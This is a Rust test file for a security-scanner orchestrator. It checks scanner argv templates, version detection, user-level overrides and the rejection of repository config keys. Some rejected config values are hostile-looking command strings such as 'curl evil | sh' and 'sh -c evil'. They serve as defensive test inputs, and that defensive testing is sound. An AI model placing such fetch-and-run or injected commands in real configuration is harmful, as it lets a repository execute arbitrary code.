//! Tests for the scanner registry and the orchestrator ([S-665], [FR-SC-05],
//! [NFR-SE-08], [NFR-SE-02]).
//!
//! No real scanner runs here. Every scanner is a stub shell script in a
//! temporary directory that becomes the **only** entry of the search path, so
//! a scanner installed on this machine is never found. A stub records each
//! invocation's argv, answers its version command, and copies the scanner's
//! committed fixture SARIF (`tests/fixtures/sarif/`) to the output its template
//! names. The tests then assert the argv against a literal copy of each
//! template and parse every produced report through [S-663]'s parser.
//!
//! [S-665]: ../../../docs/planning/journal.md#s-665-a-registry-of-nine-scanners-detects-what-is-installed-and-runs-each-to-sarif
//! [S-663]: ../../../docs/planning/journal.md#s-663-sarif-findings-are-ingested-into-the-evidence-store-anchored-and-redacted
//! [FR-SC-05]: ../../../docs/specs/requirements/FR-SC-05.md
//! [NFR-SE-02]: ../../../docs/specs/requirements/NFR-SE-02.md
//! [NFR-SE-08]: ../../../docs/specs/requirements/NFR-SE-08.md

use std::ffi::OsString;
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};

use tempfile::TempDir;

use super::registry::{parse_version, Fill, Ignores, ScopedPath, Targets, REGISTRY};
use super::{
    scanner, Coverage, CoverageKind, CopyKind, Detection, IgnoredPaths, Orchestrator, Outcome, ScanEnvironment, ScanReport,
    ScannerOutcome, Selection, OUTPUT_DIR, REQUIRES_BUILD,
};
use crate::config::{parse_config, parse_user_config, ConfigError, SECURITY_SCANNERS};
use crate::history::security::parse_report;

/// The version line each stub prints, in the shape the real scanner prints it,
/// and the version detection must read from it.
const VERSIONS: &[(&str, &str, &str)] = &[
    ("semgrep", "1.85.0", "1.85.0"),
    ("trivy", "Version: 0.74.0\nVulnerability DB:\n  Version: 2", "0.74.0"),
    ("gitleaks", "v8.18.4", "8.18.4"),
    ("osv-scanner", "osv-scanner version: 1.9.1\ncommit: 4a2b9c1", "1.9.1"),
    ("bandit", "bandit 1.7.10\n  python version = 3.12.4", "1.7.10"),
    ("gosec", "Version: 2.21.4\nGit tag: v2.21.4", "2.21.4"),
    ("checkov", "3.2.255", "3.2.255"),
    ("codeql", "2.19.3", "2.19.3"),
    ("dependency-check", "Dependency-Check Core version 10.0.4", "10.0.4"),
];

/// The flag after which each scanner's template places its output, and the
/// file a directory output must hold.
const OUTPUTS: &[(&str, &str, Option<&str>)] = &[
    ("semgrep", "--output", None),
    ("trivy", "--output", None),
    ("gitleaks", "--report-path", None),
    ("osv-scanner", "--output-file", None),
    ("bandit", "--output", None),
    ("gosec", "-out", None),
    ("checkov", "--output-file-path", Some("results_sarif.sarif")),
    ("codeql", "--output", None),
    ("dependency-check", "--out", Some("dependency-check-report.sarif")),
];

/// The fixture project: Python, Go, Terraform and a manifest.
const PROJECT: &[(&str, &str)] = &[
    ("app/db.py", "import sqlite3\n"),
    ("cmd/server/main.go", "package main\n\nfunc main() {}\n"),
    ("infra/main.tf", "resource \"aws_s3_bucket\" \"data\" {}\n"),
    ("requirements.txt", "Django==2.2.0\n"),
];

fn fixture(scanner: &str) -> PathBuf {
    Path::new(env!("CARGO_MANIFEST_DIR"))
        .join("tests/fixtures/sarif")
        .join(format!("{scanner}.sarif"))
}

fn lookup<'a>(table: &'a [(&str, &'a str, &'a str)], name: &str) -> (&'a str, &'a str) {
    let row = table.iter().find(|r| r.0 == name).expect("listed");
    (row.1, row.2)
}

/// A temporary world: a project root, a stub `bin/` that is the whole search
/// path, a record directory, and a user-level config directory.
struct World {
    _tmp: TempDir,
    root: PathBuf,
    bin: PathBuf,
    rec: PathBuf,
    user: PathBuf,
}

impl World {
    fn new(files: &[(&str, &str)]) -> Self {
        let tmp = TempDir::new().expect("temp root");
        let base = tmp.path().canonicalize().unwrap();
        let (root, bin, rec, user) = (
            base.join("project"),
            base.join("bin"),
            base.join("rec"),
            base.join("user"),
        );
        for dir in [&root, &bin, &rec, &user] {
            fs::create_dir_all(dir).unwrap();
        }
        for (path, body) in files {
            let full = root.join(path);
            fs::create_dir_all(full.parent().unwrap()).unwrap();
            fs::write(full, body).unwrap();
        }
        Self { _tmp: tmp, root, bin, rec, user }
    }

    /// Install a stub for `name` in `bin/` that exits `exit` after producing
    /// its fixture report.
    fn stub(&self, name: &str, exit: i32) {
        self.stub_at(&self.bin.join(name), name, name, exit, "");
    }

    /// Install a stub for scanner `name` at `path`, recording under `record`.
    /// `extra` is shell run just before the exit.
    fn stub_at(&self, path: &Path, name: &str, record: &str, exit: i32, extra: &str) {
        let (version, _) = lookup(VERSIONS, name);
        let row = OUTPUTS.iter().find(|r| r.0 == name).unwrap();
        let (flag, produced) = (row.1, row.2);
        let env = self.rec.join(format!("{record}.env"));
        let record = self.rec.join(format!("{record}.argv"));
        let copy = match produced {
            None => format!("/bin/cp '{}' \"$out\"", fixture(name).display()),
            Some(file) => format!(
                "/bin/mkdir -p \"$out\" && /bin/cp '{}' \"$out/{file}\"",
                fixture(name).display()
            ),
        };
        let script = format!(
            "#!/bin/sh\n\
             for a in \"$@\"; do printf '%s\\n' \"$a\"; done >> '{record}'\n\
             printf '%s\\n' '--end--' >> '{record}'\n\
             printf 'SEMGREP_ENABLE_VERSION_CHECK=%s TRIVY_SKIP_VERSION_CHECK=%s GOTOOLCHAIN=%s\\n' \
             \"$SEMGREP_ENABLE_VERSION_CHECK\" \"$TRIVY_SKIP_VERSION_CHECK\" \"$GOTOOLCHAIN\" >> '{env}'\n\
             printf 'cwd=%s\\npath=%s\\n' \"$(pwd -P)\" \"$PATH\" >> '{env}'\n\
             printf 'lgtm=%s\\n' \"$LGTM_INDEX_FILTERS\" >> '{env}'\n\
             case \"$1\" in --version|version|-version) printf '%s\\n' '{version}'; exit 0;; esac\n\
             out=''; prev=''\n\
             for a in \"$@\"; do if [ \"$prev\" = '{flag}' ]; then out=\"$a\"; fi; prev=\"$a\"; done\n\
             if [ -n \"$out\" ]; then {copy}; fi\n\
             {extra}\n\
             exit {exit}\n",
            record = record.display(),
            env = env.display(),
        );
        write_executable(path, &script);
    }

    fn all_stubs(&self) {
        for s in &REGISTRY {
            self.stub(s.name, 0);
        }
    }

    fn search_path(&self) -> Option<OsString> {
        Some(self.bin.clone().into_os_string())
    }

    fn open(&self) -> Result<Orchestrator, ConfigError> {
        Orchestrator::open_with(&self.root, Some(&self.user), self.search_path())
    }

    fn scan(&self, selection: &Selection) -> ScanReport {
        self.open().expect("config loads").scan(selection).expect("scan runs")
    }

    fn repo_config(&self, text: &str) {
        let dir = self.root.join(".logos");
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("config.toml"), text).unwrap();
    }

    fn user_config(&self, text: &str) {
        fs::write(self.user.join("config.toml"), text).unwrap();
    }

    /// Every recorded invocation of `name`, oldest first.
    fn invocations(&self, name: &str) -> Vec<Vec<String>> {
        let Ok(text) = fs::read_to_string(self.rec.join(format!("{name}.argv"))) else {
            return Vec::new();
        };
        let mut calls = Vec::new();
        let mut current = Vec::new();
        for line in text.lines() {
            if line == "--end--" {
                calls.push(std::mem::take(&mut current));
            } else {
                current.push(line.to_string());
            }
        }
        calls
    }

    /// Every invocation of `name` other than its version probe.
    fn runs(&self, name: &str) -> Vec<Vec<String>> {
        let probe: Vec<String> = scanner(name)
            .unwrap()
            .version_args
            .iter()
            .map(|s| (*s).to_string())
            .collect();
        self.invocations(name).into_iter().filter(|c| *c != probe).collect()
    }

    fn out(&self, file: &str) -> String {
        self.root.join(OUTPUT_DIR).join(file).display().to_string()
    }
}

fn write_executable(path: &Path, body: &str) {
    fs::write(path, body).unwrap();
    fs::set_permissions(path, fs::Permissions::from_mode(0o755)).unwrap();
}

fn outcome<'a>(report: &'a ScanReport, name: &str) -> &'a ScannerOutcome {
    report
        .outcomes
        .iter()
        .find(|o| o.scanner == name)
        .unwrap_or_else(|| panic!("{name} has an outcome"))
}

fn strings(items: &[&str]) -> Vec<String> {
    items.iter().map(|s| (*s).to_string()).collect()
}

/// The argv each template must produce on a full scan, written out by hand —
/// the second spelling that pins the registry's.
fn expected_runs(w: &World) -> Vec<(&'static str, Vec<Vec<String>>)> {
    let dir = |name: &str| w.root.join(OUTPUT_DIR).join(name).display().to_string();
    vec![
        (
            "semgrep",
            vec![strings(&[
                "scan", "--config", "p/default", "--sarif", "--output", &w.out("semgrep.sarif"),
                "--metrics", "off", "--disable-version-check", "--quiet", "--exclude", ".logos", ".",
            ])],
        ),
        (
            "trivy",
            vec![strings(&[
                "fs", "--scanners", "vuln,secret,misconfig", "--format", "sarif", "--output",
                &w.out("trivy.sarif"), "--skip-dirs", ".logos", "--config", &w.out("empty-config.yaml"), ".",
            ])],
        ),
        (
            "gitleaks",
            vec![strings(&[
                "detect", "--redact", "--no-banner", "--exit-code", "0", "--report-format", "sarif",
                "--report-path", &w.out("gitleaks.sarif"), "--source", ".",
            ])],
        ),
        (
            "osv-scanner",
            vec![strings(&[
                "--format", "sarif", "--output-file", &w.out("osv-scanner.sarif"), "--recursive", ".",
            ])],
        ),
        (
            "bandit",
            vec![strings(&[
                "--recursive", "--format", "sarif", "--output", &w.out("bandit.sarif"),
                "--exit-zero", "--quiet", "--exclude", "./.logos", ".",
            ])],
        ),
        (
            "gosec",
            vec![strings(&["-fmt", "sarif", "-out", &w.out("gosec.sarif"), "-no-fail", "-quiet", "./..."])],
        ),
        (
            "checkov",
            vec![strings(&[
                "--output", "sarif", "--output-file-path", &dir("checkov"), "--soft-fail", "--quiet",
                "--skip-framework", "secrets", "--skip-path", ".logos", "--directory", ".",
            ])],
        ),
        (
            "codeql",
            vec![
                strings(&[
                    "database", "create", &dir("codeql/python"), "--language=python",
                    "--build-mode=none", "--source-root=.", "--overwrite",
                ]),
                strings(&[
                    "database", "analyze", &dir("codeql/python"), "--format=sarif-latest", "--output",
                    &w.out("codeql/python.sarif"),
                ]),
            ],
        ),
        (
            "dependency-check",
            vec![strings(&[
                "--scan", ".", "--format", "SARIF", "--out", &dir("dependency-check"), "--exclude",
                "**/.logos/**", "--disableYarnAudit", "--disablePnpmAudit", "--disableBundleAudit",
                "--disableGolangMod", "--disableMixAudit",
            ])],
        ),
    ]
}

#[test]
fn the_registry_holds_the_nine_configured_scanners_in_order() {
    let names: Vec<&str> = REGISTRY.iter().map(|s| s.name).collect();
    assert_eq!(names, SECURITY_SCANNERS);
    // Every scanner names the driver its SARIF carries, which the ingest stores.
    for s in &REGISTRY {
        let text = fs::read_to_string(fixture(s.name)).unwrap();
        let (_, runs) = parse_report(&text).unwrap();
        assert_eq!(runs[0].scanner_name, s.driver, "{}'s fixture driver", s.name);
    }
}

#[test]
fn detection_reports_each_scanner_installed_with_its_version_or_not_installed() {
    let w = World::new(PROJECT);
    let installed = ["semgrep", "trivy", "gitleaks", "osv-scanner", "bandit", "gosec", "dependency-check"];
    for name in installed {
        w.stub(name, 0);
    }
    let states = w.open().unwrap().detect();
    assert_eq!(
        states.iter().map(|s| s.scanner).collect::<Vec<_>>(),
        SECURITY_SCANNERS,
        "one state per registered scanner, in order"
    );
    for state in &states {
        if installed.contains(&state.scanner) {
            let (_, version) = lookup(VERSIONS, state.scanner);
            assert_eq!(
                state.detection,
                Detection::Installed {
                    binary: w.bin.join(state.scanner),
                    version: Some(version.to_string()),
                    copy: CopyKind::Path,
                },
                "{} is installed with its version",
                state.scanner
            );
            // The probe is the version command and nothing else.
            let probe = strings(scanner(state.scanner).unwrap().version_args);
            assert_eq!(w.invocations(state.scanner), vec![probe], "{}'s probe", state.scanner);
        } else {
            assert_eq!(state.detection, Detection::NotInstalled, "{}", state.scanner);
        }
    }
    // The update-check opt-outs ride on the probe itself.
    let env = |name: &str| fs::read_to_string(w.rec.join(format!("{name}.env"))).unwrap();
    assert!(env("semgrep").contains("SEMGREP_ENABLE_VERSION_CHECK=0 "), "{}", env("semgrep"));
    assert!(env("trivy").contains("TRIVY_SKIP_VERSION_CHECK=true"), "{}", env("trivy"));
    assert!(env("gosec").contains("GOTOOLCHAIN=local"), "{}", env("gosec"));
}

#[test]
fn every_template_runs_its_fixed_argv_and_its_output_parses_through_the_ingest_parser() {
    let w = World::new(PROJECT);
    w.all_stubs();
    let report = w.scan(&Selection::All);
    assert_eq!(report.outcomes.len(), 9);
    for (name, expected) in expected_runs(&w) {
        assert_eq!(w.runs(name), expected, "{name}'s argv is its template");
        let o = outcome(&report, name);
        let (_, version) = lookup(VERSIONS, name);
        assert_eq!(o.version.as_deref(), Some(version), "{name}'s version");
        let Outcome::Ran { sarif, requires_build } = &o.outcome else {
            panic!("{name} ran: {:?}", o.outcome);
        };
        let expected_build: Vec<String> = if name == "codeql" { strings(&["go"]) } else { Vec::new() };
        assert_eq!(*requires_build, expected_build, "{name}'s skipped languages");
        assert_eq!(sarif.len(), 1, "{name} wrote one report");
        assert!(sarif[0].starts_with(w.root.join(OUTPUT_DIR)), "{name} writes under .logos/security");
        let text = fs::read_to_string(&sarif[0]).unwrap();
        let (_, runs) = parse_report(&text).unwrap_or_else(|e| panic!("{name}'s output parses: {e:#}"));
        assert_eq!(runs[0].scanner_name, o.driver, "{name}'s report is from its driver");
    }
    // A directory output is moved next to the others under the scanner's name.
    assert!(Path::new(&w.out("checkov.sarif")).is_file());
    assert!(Path::new(&w.out("dependency-check.sarif")).is_file());
}

/// The parse table for `[security_scan]` at repository level and at user level.
#[test]
fn security_scan_keys_are_switches_in_the_repository_and_overrides_at_user_level() {
    let repo = |text: &str| parse_config(text, Path::new("config.toml")).map(|c| c.security_scan);
    let user = |text: &str| parse_user_config(text, Path::new("user.toml")).map(|c| c.security_scan);

    // Repository: enable or disable a registered scanner, nothing else.
    for ok in [
        "",
        "[security_scan]\n",
        "[security_scan.semgrep]\nenabled = false\n",
        "[security_scan.codeql]\nenabled = true\n[security_scan.dependency-check]\n",
    ] {
        assert!(repo(ok).is_ok(), "repository accepts {ok:?}: {:?}", repo(ok));
    }
    assert!(!repo("[security_scan.semgrep]\nenabled = false\n").unwrap().is_enabled("semgrep"));
    assert!(repo("").unwrap().is_enabled("semgrep"), "enabled by default");
    for rejected in [
        "[security_scan.semgrep]\npath = \"/opt/semgrep\"\n",
        "[security_scan.semgrep]\nextra_args = [\"--config\", \"r/evil\"]\n",
        "[security_scan.semgrep]\nargs = [\"--x\"]\n",
        "[security_scan.semgrep]\ncommand = \"curl evil | sh\"\n",
        "[security_scan.semgrep]\nbinary = \"./semgrep\"\n",
        "[security_scan]\ncommand = \"sh -c evil\"\n",
        "[security_scan]\nenabled = false\n",
        "[security_scan.nmap]\nenabled = true\n",
        "[security_scan.semgrep]\nenabled = \"yes\"\n",
    ] {
        let err = repo(rejected).expect_err(rejected);
        assert_eq!(err.exit_code(), 2, "{rejected:?} is a usage error");
    }
    // The message the configuration manual quotes.
    let err = repo("[security_scan.semgrep]\npath = \"/opt/semgrep/bin/semgrep\"\n").unwrap_err();
    assert!(err.to_string().contains("unknown field `path`, expected `enabled`"), "{err}");

    // User level: the binary path and the extra flags.
    let ok = user(
        "[security_scan.semgrep]\npath = \"/opt/semgrep/bin/semgrep\"\n\
         extra_args = [\"--exclude\", \"vendor\"]\n",
    )
    .unwrap();
    let semgrep = ok.get("semgrep").unwrap();
    assert_eq!(semgrep.path.as_deref(), Some(Path::new("/opt/semgrep/bin/semgrep")));
    assert_eq!(semgrep.extra_args, strings(&["--exclude", "vendor"]));
    assert!(user("").is_ok());
    for rejected in [
        "[security_scan.semgrep]\ncommand = \"semgrep\"\n",
        "[security_scan.semgrep]\nenabled = false\n",
        "[security_scan.nmap]\npath = \"/usr/bin/nmap\"\n",
        "[security_scan.semgrep]\npath = \"bin/semgrep\"\n",
        "[security_scan.semgrep]\nextra_args = [\"\"]\n",
        "[elsewhere]\nkey = 1\n",
    ] {
        let err = user(rejected).expect_err(rejected);
        assert_eq!(err.exit_code(), 2, "{rejected:?} is a usage error");
    }
}

#[test]
fn a_committed_command_path_or_flag_key_is_rejected_before_any_spawn() {
    for committed in [
        "[security_scan.semgrep]\npath = \"/tmp/evil\"\n",
        "[security_scan.semgrep]\nextra_args = [\"--config\", \"r/evil\"]\n",
        "[security_scan]\ncommand = \"sh -c evil\"\n",
    ] {
        let w = World::new(PROJECT);
        w.all_stubs();
        w.repo_config(committed);
        let err = w.open().expect_err(committed);
        assert_eq!(err.exit_code(), 2);
        assert!(
            fs::read_dir(&w.rec).unwrap().next().is_none(),
            "{committed:?}: nothing was spawned"
        );
    }
}

#[test]
fn the_same_keys_at_user_level_take_effect() {
    let w = World::new(PROJECT);
    w.all_stubs();
    // A second semgrep, outside the search path, chosen by the user.
    let custom_dir = w.user.join("tools");
    fs::create_dir_all(&custom_dir).unwrap();
    let custom = custom_dir.join("semgrep-pinned");
    w.stub_at(&custom, "semgrep", "semgrep-pinned", 0, "");
    w.user_config(&format!(
        "[security_scan.semgrep]\npath = \"{}\"\nextra_args = [\"--exclude\", \"vendor\"]\n\
         [security_scan.codeql]\nextra_args = [\"--threads=2\"]\n\
         [security_scan.gosec]\nextra_args = [\"-exclude=G104\"]\n",
        custom.display()
    ));
    let report = w.scan(&Selection::Only(strings(&["semgrep", "codeql", "gosec"])));
    assert_eq!(report.outcomes.len(), 3);

    let semgrep = outcome(&report, "semgrep");
    assert!(matches!(semgrep.outcome, Outcome::Ran { .. }), "{semgrep:?}");
    // Only the user's binary ran — the copy on the search path never did — and
    // the run carries the extra flags at the template's extra position, before
    // the path position.
    assert!(w.invocations("semgrep").is_empty(), "the search-path semgrep never ran");
    let pinned: Vec<Vec<String>> = w
        .invocations("semgrep-pinned")
        .into_iter()
        .filter(|c| *c != strings(&["--version"]))
        .collect();
    assert_eq!(
        pinned,
        vec![strings(&[
            "scan", "--config", "p/default", "--sarif", "--output", &w.out("semgrep.sarif"),
            "--metrics", "off", "--disable-version-check", "--quiet", "--exclude", ".logos",
            "--exclude", "vendor", ".",
        ])]
    );
    assert_eq!(w.invocations("semgrep-pinned").len(), 2, "probe + run of the user's binary");
    // gosec stops reading flags at its first positional: the extras precede it.
    assert_eq!(
        w.runs("gosec"),
        vec![strings(&[
            "-fmt", "sarif", "-out", &w.out("gosec.sarif"), "-no-fail", "-quiet", "-exclude=G104", "./...",
        ])]
    );
    // CodeQL's extras go to the analysis, never to database creation.
    let codeql = w.runs("codeql");
    assert_eq!(codeql.len(), 2);
    assert!(!codeql[0].contains(&"--threads=2".to_string()), "{:?}", codeql[0]);
    assert_eq!(codeql[1].last().map(String::as_str), Some("--threads=2"));
}

/// Each detection names its copy: the user's override first, then a copy on
/// the search path, then the managed copy at the builtin manifest's pinned
/// version — and a managed copy of any other version is never used (S-743).
#[test]
fn a_scanner_is_the_override_then_the_path_copy_then_the_managed_copy() {
    let w = World::new(PROJECT);
    let tools = w.user.join("managed-tools");
    let pinned = |tool: &str| {
        let entry = crate::tools::Manifest::builtin().tool(tool).unwrap();
        tools.join(tool).join(&entry.version).join(&entry.binary)
    };
    for tool in ["semgrep", "trivy", "gitleaks", "gosec"] {
        w.stub(tool, 0);
    }
    for tool in ["trivy", "gitleaks", "osv-scanner"] {
        fs::create_dir_all(pinned(tool).parent().unwrap()).unwrap();
        w.stub_at(&pinned(tool), tool, &format!("{tool}-managed"), 0, "");
    }
    // A managed copy that is not the pinned version is not a copy at all.
    let stale = tools.join("gosec").join("0.0.1").join("gosec");
    fs::create_dir_all(stale.parent().unwrap()).unwrap();
    w.stub_at(&stale, "gosec", "gosec-stale", 0, "");
    fs::remove_file(w.bin.join("gosec")).unwrap();
    let custom = w.user.join("semgrep-custom");
    w.stub_at(&custom, "semgrep", "semgrep-custom", 0, "");
    w.user_config(&format!("[security_scan.semgrep]\npath = \"{}\"\n", custom.display()));

    let env = ScanEnvironment {
        user_dir: Some(w.user.clone()),
        search_path: Some(w.bin.clone().into_os_string()),
        tools_dir: Some(tools.clone()),
        nvd_api_key: None,
    };
    let states = Orchestrator::open_in(&w.root, &env).unwrap().detect();
    let copy = |name: &str| match &states.iter().find(|s| s.scanner == name).unwrap().detection {
        Detection::Installed { binary, copy, .. } => Some((binary.clone(), *copy)),
        _ => None,
    };
    assert_eq!(copy("semgrep"), Some((custom, CopyKind::Override)));
    assert_eq!(copy("trivy"), Some((w.bin.join("trivy"), CopyKind::Path)), "PATH before managed");
    assert_eq!(copy("osv-scanner"), Some((pinned("osv-scanner"), CopyKind::Managed)));
    assert_eq!(copy("gosec"), None, "only the pinned version is looked at");
    // `open_with` names no tools directory, so it finds no managed copy.
    let without = Orchestrator::open_with(&w.root, Some(&w.user), Some(w.bin.clone().into_os_string()))
        .unwrap()
        .detect();
    assert_eq!(without[3].scanner, "osv-scanner");
    assert_eq!(without[3].detection, Detection::NotInstalled);
}

/// A tools directory inside the project — as written, or reached through a
/// symlink from outside it — supplies no managed copy: the repository could
/// plant one ([NFR-SE-08]).
///
/// [NFR-SE-08]: ../../../docs/specs/requirements/NFR-SE-08.md
#[test]
fn a_tools_directory_inside_the_project_supplies_no_managed_copy() {
    let w = World::new(PROJECT);
    let entry = crate::tools::Manifest::builtin().tool("osv-scanner").unwrap();
    let planted = w.root.join(".local/share/logos/tools");
    let binary = planted.join("osv-scanner").join(&entry.version).join("osv-scanner");
    fs::create_dir_all(binary.parent().unwrap()).unwrap();
    w.stub_at(&binary, "osv-scanner", "osv-scanner-planted", 0, "");
    let link = w.user.join("tools-link");
    std::os::unix::fs::symlink(&planted, &link).unwrap();
    for tools_dir in [planted.clone(), link] {
        let env = ScanEnvironment {
            user_dir: Some(w.user.clone()),
            search_path: Some(w.bin.clone().into_os_string()),
            tools_dir: Some(tools_dir.clone()),
            nvd_api_key: None,
        };
        let states = Orchestrator::open_in(&w.root, &env).unwrap().detect();
        assert_eq!(states[3].scanner, "osv-scanner");
        assert_eq!(states[3].detection, Detection::NotInstalled, "{}", tools_dir.display());
    }
    assert!(w.invocations("osv-scanner-planted").is_empty(), "the planted copy never ran");
}

#[test]
fn a_user_path_that_does_not_exist_is_not_installed_rather_than_a_path_lookup() {
    let w = World::new(PROJECT);
    w.all_stubs();
    w.user_config("[security_scan.semgrep]\npath = \"/nonexistent/semgrep\"\n");
    let states = w.open().unwrap().detect();
    assert_eq!(states[0].scanner, "semgrep");
    assert_eq!(states[0].detection, Detection::NotInstalled);
    assert!(w.invocations("semgrep").is_empty(), "the PATH copy is not used instead");
}

#[test]
fn codeql_on_build_requiring_languages_is_skipped_with_the_reason_and_no_build_is_spawned() {
    let w = World::new(&[
        ("cmd/server/main.go", "package main\n"),
        ("android/App.kt", "fun main() {}\n"),
        ("ios/App.swift", "print(1)\n"),
        ("native/lib.c", "int f(void) { return 0; }\n"),
        ("README.md", "# fixture\n"),
    ]);
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    assert_eq!(
        outcome(&report, "codeql").outcome,
        Outcome::RequiresBuild {
            languages: strings(&["c-cpp", "go", "kotlin", "swift"]),
            reason: REQUIRES_BUILD,
        }
    );
    assert_eq!(REQUIRES_BUILD, "requires a build — ingest a CI report");
    assert_eq!(outcome(&report, "codeql").coverage, None, "nothing ran, so no coverage is stated");
    // The version probe is the only process CodeQL was started for.
    assert_eq!(w.invocations("codeql"), vec![strings(&["version", "--format=terse"])]);
    assert!(!w.root.join(OUTPUT_DIR).join("codeql").exists(), "no database was created");
}

/// Java's `none` mode still resolves dependencies through the project's own
/// Maven or Gradle build, so a Java project is reported as needing a build and
/// nothing — no CodeQL step, no `gradlew` — is started ([NFR-SE-02]).
///
/// [NFR-SE-02]: ../../../docs/specs/requirements/NFR-SE-02.md
#[test]
fn codeql_on_a_java_only_project_is_skipped_and_its_build_is_never_run() {
    let w = World::new(&[("src/main/java/App.java", "class App {}\n"), ("build.gradle", "")]);
    let marker = w.user.join("gradlew-ran");
    write_executable(&w.root.join("gradlew"), &format!("#!/bin/sh\n: > '{}'\n", marker.display()));
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    assert_eq!(
        outcome(&report, "codeql").outcome,
        Outcome::RequiresBuild { languages: strings(&["java"]), reason: REQUIRES_BUILD }
    );
    assert_eq!(w.invocations("codeql"), vec![strings(&["version", "--format=terse"])]);
    assert!(!marker.exists(), "the project's build was never run");
}

/// Every source-only language present runs, each with its own database and
/// report, in registry order, with `--build-mode=none` and no other mode.
#[test]
fn codeql_runs_each_source_only_language_with_build_mode_none() {
    let w = World::new(&[("web/app.ts", "export {}\n"), ("app/db.py", ""), ("lib/x.rb", "")]);
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    let Outcome::Ran { sarif, requires_build } = &outcome(&report, "codeql").outcome else {
        panic!("{report:?}");
    };
    let labels = ["javascript-typescript", "python", "ruby"];
    // One report for the whole project, so its languages ingest as one snapshot
    // (a snapshot is keyed by HEAD and scanner: per-language reports ingested
    // one by one would each replace the last). Each language's runs are in it.
    assert_eq!(*sarif, vec![PathBuf::from(w.out("codeql.sarif"))]);
    let (_, runs) = parse_report(&fs::read_to_string(&sarif[0]).unwrap()).unwrap();
    assert_eq!(runs.len(), labels.len(), "one run per language, merged");
    for label in labels {
        assert!(Path::new(&w.out(&format!("codeql/{label}.sarif"))).is_file(), "{label}'s own report");
        assert!(!Path::new(&w.out(&format!("codeql-{label}.sarif"))).exists(), "no per-language report the watcher would admit");
    }
    assert!(requires_build.is_empty());
    let runs = w.runs("codeql");
    assert_eq!(runs.len(), 6, "create + analyze per language: {runs:?}");
    for (i, label) in labels.iter().enumerate() {
        let (create, analyze) = (&runs[2 * i], &runs[2 * i + 1]);
        assert_eq!(create[..2], strings(&["database", "create"]));
        assert!(create.contains(&format!("--language={label}")), "{create:?}");
        assert_eq!(create.iter().filter(|a| a.starts_with("--build-mode")).collect::<Vec<_>>(), ["--build-mode=none"]);
        assert_eq!(analyze[..2], strings(&["database", "analyze"]));
        assert!(!analyze.iter().any(|a| a.starts_with("--build-mode")), "{analyze:?}");
    }
}

/// A failed database creation stops CodeQL with that step's exit code and
/// stderr; the analysis is never started.
#[test]
fn a_failed_codeql_database_creation_is_its_failure() {
    let w = World::new(&[("app/db.py", "")]);
    let record = w.rec.join("codeql.argv");
    write_executable(
        &w.bin.join("codeql"),
        &format!(
            "#!/bin/sh\nprintf '%s\\n' \"$*\" >> '{}'\n\
             case \"$1\" in version) printf '2.19.3\\n'; exit 0;; esac\n\
             printf 'extractor crashed\\n' >&2\nexit 2\n",
            record.display()
        ),
    );
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    assert_eq!(
        outcome(&report, "codeql").outcome,
        Outcome::Failed { exit_code: Some(2), stderr: "extractor crashed".to_string() }
    );
    let calls = fs::read_to_string(&record).unwrap();
    assert!(!calls.contains("database analyze"), "{calls}");
}

#[test]
fn codeql_with_no_language_it_analyses_is_not_applicable() {
    let w = World::new(&[("infra/main.tf", "")]);
    w.stub("codeql", 0);
    let report = w.scan(&Selection::Only(strings(&["codeql"])));
    assert!(
        matches!(outcome(&report, "codeql").outcome, Outcome::NotApplicable { .. }),
        "{report:?}"
    );
    assert_eq!(outcome(&report, "codeql").coverage, None, "nothing ran, so no coverage is stated");
    assert_eq!(w.runs("codeql"), Vec::<Vec<String>>::new());
}

/// S-769: a scanner that reads one language's files is `not applicable` on a
/// project without one, and is never started — not even its version probe.
/// The walk is the ignore-aware one ([`super::project_walk`]): a Go file in an
/// ignored directory is no Go code, nor is a near miss (`main.go.md`, a
/// directory named `x.go`). One Go file the project does not ignore makes
/// gosec run again.
#[test]
fn a_scanner_with_none_of_its_files_is_not_applicable_and_never_started() {
    let w = World::new(&[
        (".gitignore", "/third_party/\n"),
        ("third_party/lib.go", "package lib\n"),
        ("third_party/lib.py", "x = 1\n"),
        ("docs/main.go.md", "# not Go\n"),
        ("pkg/x.go/README", "a directory, not a Go file\n"),
        ("web/app.js", "1;\n"),
    ]);
    for name in ["gosec", "bandit", "semgrep"] {
        w.stub(name, 0);
    }
    let report = w.scan(&Selection::Only(strings(&["gosec", "bandit", "semgrep"])));
    for (name, files) in [("gosec", "Go source file (.go)"), ("bandit", "Python source file (.py, .pyw)")] {
        let ran = outcome(&report, name);
        let Outcome::NotApplicable { reason } = &ran.outcome else { panic!("{name}: {ran:?}") };
        assert_eq!(reason, &format!("no {files} among the files the project does not ignore"), "{name}");
        assert_eq!((ran.version.as_deref(), ran.coverage.as_ref()), (None, None), "{name} was never probed: {ran:?}");
        assert!(w.invocations(name).is_empty(), "{name} was started: {:?}", w.invocations(name));
    }
    assert!(matches!(outcome(&report, "semgrep").outcome, Outcome::Ran { .. }), "a scanner with no rule runs: {report:?}");

    fs::write(w.root.join("cmd.go"), "package main\n").unwrap();
    let report = w.scan(&Selection::Only(strings(&["gosec"])));
    assert!(matches!(outcome(&report, "gosec").outcome, Outcome::Ran { .. }), "{report:?}");
    assert_eq!(w.runs("gosec").len(), 1, "one Go file the project keeps is enough");

    // Bandit reads `.pyw` as well as `.py`: one such script is enough.
    fs::write(w.root.join("tool.pyw"), "x = 1\n").unwrap();
    let report = w.scan(&Selection::Only(strings(&["bandit"])));
    assert!(matches!(outcome(&report, "bandit").outcome, Outcome::Ran { .. }), "{report:?}");
}

#[test]
fn a_disabled_scanner_is_neither_probed_nor_run() {
    let w = World::new(PROJECT);
    w.all_stubs();
    w.repo_config("[security_scan.trivy]\nenabled = false\n");
    let orchestrator = w.open().unwrap();
    assert_eq!(orchestrator.detect()[1].detection, Detection::Disabled);
    let report = orchestrator.scan(&Selection::Only(strings(&["trivy", "gitleaks"]))).unwrap();
    assert_eq!(outcome(&report, "trivy").outcome, Outcome::Disabled);
    assert!(matches!(outcome(&report, "gitleaks").outcome, Outcome::Ran { .. }));
    assert!(w.invocations("trivy").is_empty(), "a disabled scanner is never spawned");
}

#[test]
fn a_failing_scanner_reports_its_stderr_and_never_stops_the_others() {
